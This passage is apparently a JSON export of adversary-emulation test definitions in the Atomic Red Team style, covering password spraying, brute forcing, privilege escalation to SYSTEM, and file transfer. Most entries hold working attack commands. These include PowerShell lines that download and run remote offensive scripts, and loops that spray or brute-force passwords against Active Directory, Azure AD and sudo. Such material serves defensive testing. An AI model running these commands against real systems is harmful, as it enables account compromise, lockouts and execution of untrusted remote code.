["clacwm6ih03is29mq6ya20wt9"], "tags": []}, {"data": {"name": "WinPwn - DomainPasswordSpray Attacks", "shortName": "T1110.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "DomainPasswordSpray Attacks technique via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndomainpassspray -consoleoutput -noninteractive -emptypasswords", "successCriteria": null}], "techniqueIds": ["clacwm685036x29mqe5usae0i"], "tags": []}, {"data": {"name": "Password Spray using Kerbrute Tool", "shortName": "T1110.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Test a single password against a list of users\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | domaincontroller | Domain controller where test will be run | String | $ENV:userdnsdomain | \n | domain | Domain where you will be testing | String | $ENV:userdomain | "}, "executionSteps": [{"description": "cd $env:temp\n.\\kerbrute.exe passwordspray --dc #{domaincontroller} -d #{domain} $env:temp\\passwordspray.txt password132 \n", "successCriteria": null}], "techniqueIds": ["clacwm685036x29mqe5usae0i"], "tags": []}, {"data": {"name": "Password Spray Microsoft Online Accounts with MSOLSpray (Azure/O365)", "shortName": "T1110.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test attempts to brute force a list of Microsoft Online (Azure/O365) users with a single password via the MSOLSpray Powershell module.\n\n\n**Supported Platforms:** azure-ad\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | password | Single password to try against the list of user accounts | String | P@ssword1 | \n | user_list | File path to list of users (one per line, formatted as user@subdomain.onmicrosoft.com) | String | $env:temp\\T1110.003UserList.txt | "}, "executionSteps": [{"description": "import-module \"$env:temp\\MSOLSpray.ps1\"\nInvoke-MSOLSpray -UserList \"#{user_list}\" -Password \"#{password}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm685036x29mqe5usae0i"], "tags": []}, {"data": {"name": "Password Spray Invoke-DomainPasswordSpray Light", "shortName": "T1110.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Perform a domain password spray using the same core method of the [DomainPasswordSpray tool](https://github.com/dafthack/DomainPasswordSpray) \nbut without all the extra code that makes the script get blocked by many AVs. \nThis atomic test will attempt a single password against all users in a password list at $env:Temp\\usersdpsLight.txt. You can create this file manually\nor with the automated prereq_command. The prereq_command will limit the user list to 200 users by default to help you avoid massive account lockout.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | user_limit | The max number of users to put in the list when running the prereq_command | Integer | 200 | \n | password | The password to try for each user in users.txt | String | Spring2020 | "}, "executionSteps": [{"description": "function Invoke-dpsLight ($Password, $userlist) {\n$users = Get-Content $userlist\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\nforeach ($User in $users) {\n  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\n  if ($Domain_check.name -ne $null) {\n    Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\n  }\n  else { Write-Host \". \" -NoNewline}\n}\nWrite-Host -ForegroundColor green \"Finished\"\n}\nInvoke-dpsLight \"#{password}\" $env:Temp\\usersdpsLight.txt\n", "successCriteria": null}], "techniqueIds": ["clacwm685036x29mqe5usae0i"], "tags": []}, {"data": {"name": "Password spray all domain users with a single password via LDAP against domain controller (NTLM or Kerberos)", "shortName": "T1110.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Attempt to brute force all domain user with a single password (called \"password spraying\") on a domain controller, via LDAP, with NTLM or Kerberos\n\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user (to fetch the list of all domain users)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | password | single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001) | String | P@ssw0rd! | \n | domain | Domain FQDN | String | contoso.com | \n | auth | authentication method to choose between \"NTLM\" and \"Kerberos\" | string | NTLM | "}, "executionSteps": [{"description": "if (\"#{auth}\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\n  Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\n  exit 1\n}\n\n$DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server #{domain} | Select-Object -ExpandProperty SamAccountName\n\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"#{domain}\",389)\n\n$DomainUsers | Foreach-Object {\n  $user = $_\n  $password = \"#{password}\"\n\n  $credz = new-object System.Net.NetworkCredential($user, $password, \"#{domain}\")\n  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})\n  try {\n    Write-Host \" [-] Attempting ${password} on account ${user}.\"\n    $conn.bind()\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] ${user}:${password} are valid credentials!\"\n  } catch {\n    Write-Host $_.Exception.Message\n  }\n}\nWrite-Host \"End of password spraying\"\n", "successCriteria": null}], "techniqueIds": ["clacwm28d00nf29mqgvgncdwi"], "tags": []}, {"data": {"name": "Password Spray all Domain Users", "shortName": "T1110.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.\nThis atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\\users.txt list. Any successful authentications will be printed to the screen with a message like \"[*] username:password\", whereas a failed auth will simply print a period. Use the input arguments to specify your own password to use for the password spray.\nUse the get_prereq_command's to create a list of all domain users in the temp directory called users.txt.\nSee the \"Windows FOR Loop Password Spraying Made Easy\" blog by @OrOneEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | password | The password to try for each user in users.txt | String | Spring2020 | "}, "executionSteps": [{"description": "@FOR /F %n in (%temp%\\users.txt) do @echo | set/p=. & @net use %logonserver%\\IPC$ /user:\"%userdomain%\\%n\" \"#{password}\" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\\IPC$ > NUL\n", "successCriteria": null}], "techniqueIds": ["clacwm685036x29mqe5usae0i", "clacwm28d00nf29mqgvgncdwi"], "tags": []}, {"data": {"name": "Password spray all Azure AD users with a single password", "shortName": "T1110.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Attempt to brute force all Azure AD users with a single password (called \"password spraying\") via AzureAD Powershell module.\nValid credentials are only needed to fetch the list of Azure AD users.\n\n\n**Supported Platforms:** azure-ad\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | password | Single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001) | String | P@ssw0rd! | \n | valid_username | Valid username to retrieve Azure AD users. We encourage users running this atomic to add a valid microsoft account domain; for eg <valid_test_user>@<valid_ms_account.com> | String | bruce.wayne@contoso.com | \n | valid_password | Valid password to authenticate as valid_username in the <valid_ms_account> | String | iamthebatman | "}, "executionSteps": [{"description": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{valid_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{valid_username}\", $Pword\nConnect-AzureAD -Credential $Credential > $null\n\n($Users = Get-AzureADUser -All $true) > $null\nDisconnect-AzureAD > $null\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n\n$Users | Foreach-Object {\n  $user = $_.UserPrincipalName\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword\n  try {\n    Write-Host \" [-] Attempting #{password} on account ${user}.\"\n    Connect-AzureAD -Credential $Credential 2>&1> $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] ${user}:#{password} are valid credentials!`r`n\"\n    Disconnect-AzureAD > $null\n  } catch {\n    Write-Host \" [-] ${user}:#{password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of password spraying\"\n", "successCriteria": null}], "techniqueIds": ["clacwm685036x29mqe5usae0i"], "tags": []}, {"data": {"name": "Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)", "shortName": "T1110.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Attempt to brute force all Active Directory domain users with a single password (called \"password spraying\") on a domain controller, via LDAP, with NTLM or Kerberos\n\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user (to fetch the list of all domain users)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | password | single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001) | String | P@ssw0rd! | \n | domain | Domain FQDN | String | $env:UserDnsDomain | \n | auth | authentication method to choose between \"NTLM\" and \"Kerberos\" | String | NTLM | "}, "executionSteps": [{"description": "if (\"#{auth}\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\n  Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\n  exit 1\n}\n\n$DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server #{domain} | Select-Object -ExpandProperty SamAccountName\n\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"#{domain}\",389)\n\n$DomainUsers | Foreach-Object {\n  $user = $_\n  $password = '#{password}'\n\n  $credz = new-object System.Net.NetworkCredential($user, $password, \"#{domain}\")\n  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})\n  try {\n    Write-Host \" [-] Attempting ${password} on account ${user}.\"\n    $conn.bind()\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] ${user}:${password} are valid credentials!\"\n  } catch {\n    Write-Host $_.Exception.Message\n  }\n}\nWrite-Host \"End of password spraying\"\n", "successCriteria": null}], "techniqueIds": ["clacwm685036x29mqe5usae0i"], "tags": []}, {"data": {"name": "Password Spray (DomainPasswordSpray)", "shortName": "T1110.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain\n\nhttps://github.com/dafthack/DomainPasswordSpray\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | domain | Domain to brute force against | String | $Env:USERDOMAIN | "}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force\n", "successCriteria": null}], "techniqueIds": ["clacwm685036x29mqe5usae0i", "clacwm28d00nf29mqgvgncdwi"], "tags": []}, {"data": {"name": "Password Cracking with Hashcat", "shortName": "T1110.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | hashcat_exe | Path to Hashcat executable | String | %temp%\\hashcat6\\hashcat-6.1.1\\hashcat.exe | \n | input_file_sam | Path to SAM file | String | PathToAtomicsFolder\\T1110.002\\src\\sam.txt | \n | input_file_passwords | Path to password list | String | PathToAtomicsFolder\\T1110.002\\src\\password.lst | "}, "executionSteps": [{"description": "cd #{hashcat_exe}\\..\n#{hashcat_exe} -a 0 -m 1000 -r .\\rules\\Incisive-leetspeak.rule #{input_file_sam} #{input_file_passwords}", "successCriteria": null}], "techniqueIds": ["clacwm5u102sv29mq17du0rr7", "clacwm27y00n329mqg01j3vrs"], "tags": []}, {"data": {"name": "SUDO brute force Redhat", "shortName": "T1110.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Brute force the password of a local user account which is a member of the sudo'ers group on a Redhat based Linux distribution.  \n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password) target\nsu target\n\nPASSWORDS=(one two three password five); \\\n    touch /tmp/file; \\\n    for P in ${PASSWORDS[@]}; do \\\n        date +\"%b %d %T\"; \\\n        sudo -k && echo \"$P\" |sudo -S whoami &>/tmp/file; \\\n        echo \"exit: $?\"; \\\n        if grep -q \"root\" /tmp/file; then \\\n            echo \"FOUND: sudo => $P\"; break; \\\n        else \\\n            echo \"TRIED: $P\"; \\\n        fi; \\\n        sleep 2; \\\n    done; \\\n    rm /tmp/file\n", "successCriteria": null}], "techniqueIds": ["clacwm5q102ol29mq46kb8h6c"], "tags": []}, {"data": {"name": "SUDO brute force Debian", "shortName": "T1110.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Brute force the password of a local user account which is a member of the sudo'ers group on a Debian based Linux distribution.  \n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password) target\nsu target\n\nPASSWORDS=(one two three password five); \\\n    touch /tmp/file; \\\n    for P in ${PASSWORDS[@]}; do \\\n        date +\"%b %d %T\"; \\\n        sudo -k && echo \"$P\" |sudo -S whoami &>/tmp/file; \\\n        echo \"exit: $?\"; \\\n        if grep -q \"root\" /tmp/file; then \\\n            echo \"FOUND: sudo => $P\"; break; \\\n        else \\\n            echo \"TRIED: $P\"; \\\n        fi; \\\n        sleep 2; \\\n    done; \\\n    rm /tmp/file\n", "successCriteria": null}], "techniqueIds": ["clacwm5q102ol29mq46kb8h6c"], "tags": []}, {"data": {"name": "Password Brute User using Kerbrute Tool", "shortName": "T1110.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Bruteforce a single user's password from a wordlist\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | domaincontroller | Domain controller where test will be run | String | $ENV:userdnsdomain | \n | domain | Domain where you will be testing | String | $ENV:userdomain | "}, "executionSteps": [{"description": "cd $env:temp\n.\\kerbrute.exe bruteuser --dc #{domaincontroller} -d #{domain} $env:temp\\bruteuser.txt TestUser1 ", "successCriteria": null}], "techniqueIds": ["clacwm5q102ol29mq46kb8h6c"], "tags": []}, {"data": {"name": "Brute Force Credentials of single domain user via LDAP against domain controller (NTLM or Kerberos)", "shortName": "T1110.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Attempt to brute force domain user on a domain controller, via LDAP, with NTLM or Kerberos\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | user | Account to bruteforce | String | bruce.wayne | \n | passwords | List of passwords we will attempt to brute force with | String | Password1`n1q2w3e4r`nPassword! | \n | domain | Domain FQDN | String | contoso.com | \n | auth | authentication method to choose between \"NTLM\" and \"Kerberos\" | string | NTLM | "}, "executionSteps": [{"description": "if (\"#{auth}\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\n  Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\n  exit 1\n}\n\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"#{domain}\",389)\n\n$passwords = \"#{passwords}\".split(\"{`n}\")\nforeach ($password in $passwords){\n  $credz = new-object System.Net.NetworkCredential(\"#{user}\", $password, \"#{domain}\")\n  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})\n  try {\n    Write-Host \" [-] Attempting ${password} on account #{user}.\"\n    $conn.bind()\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] #{user}:${password} are valid credentials!\"\n  } catch {\n    Write-Host $_.Exception.Message\n  }\n}\nWrite-Host \"End of bruteforce\"\n", "successCriteria": null}], "techniqueIds": ["clacwm28400n929mqcthi910y"], "tags": []}, {"data": {"name": "Brute Force Credentials of single Azure AD user", "shortName": "T1110.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Attempt to brute force Azure AD user via AzureAD powershell module.\n\n\n**Supported Platforms:** azure-ad\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Account to bruteforce. We encourage users running this atomic to add a valid microsoft account domain; for eg \"bruce.wayne@<valid_ms_account.com>\" | String | bruce.wayne@contoso.com | \n | passwords | List of passwords we will attempt to brute force with | String | Password1`n1q2w3e4r`nPassword! | "}, "executionSteps": [{"description": "Import-Module -Name AzureAD\n\n$passwords = \"#{passwords}\".split(\"{`n}\")\nforeach($password in $passwords) {\n  $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\n  try {\n    Write-Host \" [-] Attempting ${password} on account #{username}.\"\n    Connect-AzureAD -Credential $Credential 2>&1> $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] #{username}:${password} are valid credentials!`r`n\"\n    break\n  } catch {\n    Write-Host \" [-] #{username}:${password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of bruteforce\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5q102ol29mq46kb8h6c"], "tags": []}, {"data": {"name": "Brute Force Credentials of single Active Directory domain users via SMB", "shortName": "T1110.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Attempts to brute force a single Active Directory account by testing connectivity to the IPC$ share on a domain controller\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | user | Account to bruteforce | String | %username% | "}, "executionSteps": [{"description": "echo Password1> passwords.txt\necho 1q2w3e4r>> passwords.txt\necho Password!>> passwords.txt\necho Spring2022>> passwords.txt\necho ChangeMe!>> passwords.txt\n@FOR /F \"delims=\" %p in (passwords.txt) DO @net use %logonserver%\\IPC$ /user:\"%userdomain%\\#{user}\" \"%p\" 1>NUL 2>&1 && @echo [*] #{user}:%p && @net use /delete %logonserver%\\IPC$ > NUL\n", "successCriteria": null}], "techniqueIds": ["clacwm5q102ol29mq46kb8h6c"], "tags": []}, {"data": {"name": "Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)", "shortName": "T1110.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Attempt to brute force Active Directory domain user on a domain controller, via LDAP, with NTLM or Kerberos\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | user | Account to bruteforce | String | $ENV:USERNAME | \n | passwords_path | List of passwords we will attempt to brute force with | Path | PathToAtomicsFolder\\T1110.001\\src\\passwords.txt | \n | domain | Active Directory domain FQDN | String | $env:UserDnsDomain | \n | auth | authentication method to choose between \"NTLM\" and \"Kerberos\" | String | NTLM | "}, "executionSteps": [{"description": "if (\"#{auth}\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\n  Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\n  exit 1\n}\n\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"#{domain}\",389)\n\n$passwordList = Get-Content -Path #{passwords_path}\nforeach ($password in $passwordList){\n  $credz = new-object System.Net.NetworkCredential(\"#{user}\", $password, \"#{domain}\")\n  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})\n  try {\n    Write-Host \" [-] Attempting ${password} on account #{user}.\"\n    $conn.bind()\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] #{user}:${password} are valid credentials!\"\n  } catch {\n    Write-Host $_.Exception.Message\n  }\n}\nWrite-Host \"End of bruteforce\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5q102ol29mq46kb8h6c"], "tags": []}, {"data": {"name": "Brute Force Credentials of all domain users via SMB", "shortName": "T1110.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates username and password files then attempts to brute force on remote host\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | input_file_users | Path to a file containing a list of users that we will attempt to brute force | Path | DomainUsers.txt | \n | input_file_passwords | Path to a file containing a list of passwords we will attempt to brute force with | Path | passwords.txt | \n | remote_host | Hostname of the target system we will brute force upon | String | \\\\COMPANYDC1\\IPC$ | \n | domain | Domain name of the target system we will brute force upon | String | YOUR_COMPANY | "}, "executionSteps": [{"description": "net user /domain > #{input_file_users}\necho \"Password1\" >> #{input_file_passwords}\necho \"1q2w3e4r\" >> #{input_file_passwords}\necho \"Password!\" >> #{input_file_passwords}\n@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL\n", "successCriteria": null}], "techniqueIds": ["clacwm28400n929mqcthi910y"], "tags": []}, {"data": {"name": "WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique", "shortName": "T1106", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')", "successCriteria": null}], "techniqueIds": ["clacwm5zr02yg29mqfvnm2x9z"], "tags": []}, {"data": {"name": "WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique", "shortName": "T1106", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Get SYSTEM shell - Pop System Shell using CreateProcess technique via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')", "successCriteria": null}], "techniqueIds": ["clacwm5zr02yg29mqfvnm2x9z"], "tags": []}, {"data": {"name": "WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique", "shortName": "T1106", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Get SYSTEM shell - Bind System Shell using CreateProcess technique via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')", "successCriteria": null}], "techniqueIds": ["clacwm5zr02yg29mqfvnm2x9z"], "tags": []}, {"data": {"name": "Execution through API - CreateProcess", "shortName": "T1106", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Execute program by leveraging Win32 API's. By default, this will launch calc.exe from the command prompt.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | source_file | Location of the CSharp source file to compile and execute | Path | PathToAtomicsFolder\\T1106\\src\\CreateProcess.cs | \n | output_file | Location of the payload | Path | %tmp%\\T1106.exe | "}, "executionSteps": [{"description": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:\"#{output_file}\" /target:exe #{source_file}\n%tmp%/T1106.exe\n", "successCriteria": null}], "techniqueIds": ["clacwm5zr02yg29mqfvnm2x9z", "clacwm24u00kz29mqcdm9efil"], "tags": []}, {"data": {"name": "Windows - PowerShell Download", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test uses PowerShell to download a payload.\nThis technique is used by multiple adversaries and malware families.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_file | URL of file to copy | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt | \n | destination_path | Destination path to file | Path | $env:TEMP\\Atomic-license.txt | "}, "executionSteps": [{"description": "(New-Object System.Net.WebClient).DownloadFile(\"#{remote_file}\", \"#{destination_path}\")\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1", "clacwm1yx00gw29mqcl4h79oe"], "tags": []}, {"data": {"name": "Windows - BITSAdmin BITS Download", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test uses BITSAdmin.exe to schedule a BITS job for the download of a file.\nThis technique is used by Qbot malware to download payloads.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | bits_job_name | Name of the created BITS job | String | qcxjb7 | \n | local_path | Local path to place file | Path | %temp%\\Atomic-license.txt | \n | remote_file | URL of file to copy | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt | "}, "executionSteps": [{"description": "C:\\Windows\\System32\\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1", "clacwm1yx00gw29mqcl4h79oe"], "tags": []}, {"data": {"name": "whois file download", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Download a remote file using the whois utility\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_host | Remote hostname or IP address | String | localhost | \n | remote_port | Remote port to connect to | Integer | 8443 | \n | output_file | Path of file to save output to | Path | /tmp/T1105.whois.out | \n | query | Query to send to remote server | String | Hello from Atomic Red Team test T1105 | \n | timeout | Timeout period before ending process (seconds) | Integer | 1 | "}, "executionSteps": [{"description": "timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} \"#{query}\" > #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1"], "tags": []}, {"data": {"name": "svchost writing a file to a UNC path", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "svchost.exe writing a non-Microsoft Office file to a file with a UNC path.\nUpon successful execution, this will rename cmd.exe as svchost.exe and move it to `c:\\`, then execute svchost.exe with output to a txt file.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe\nC:\\svchost.exe /c echo T1105 > \\\\localhost\\c$\\T1105.txt\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1", "clacwm1yx00gw29mqcl4h79oe"], "tags": []}, {"data": {"name": "sftp remote file copy (push)", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilize sftp to perform a remote file copy (push)\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_path | Remote path to receive sftp | Path | /tmp/victim-files/ | \n | local_file | Path of file to copy | Path | /tmp/adversary-sftp | \n | remote_host | Remote host to copy toward | String | victim-host | \n | username | User account to authenticate on remote host | String | victim | "}, "executionSteps": [{"description": "sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1", "clacwm1yx00gw29mqcl4h79oe"], "tags": []}, {"data": {"name": "sftp remote file copy (pull)", "shortName": "T1105", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilize sftp to perform a remote file copy (pull)\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_host | Remote host to copy from | String | adversary-host | \n | local_path | Local path to receive sftp | Path | /tmp/victim-files/ | \n | remote_file | Path of file to copy | Path | /tmp/adversary-sftp | \n | username | User account to authenticate on remote host | String | adversary | "}, "executionSteps": [{"description": "sftp #{username}@#{remote_host}:#{remote_file} #{local_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm6rd03sh29mqg9olase1", "clacwm1yx00gw29mqcl4h79oe"], "tags": []}, 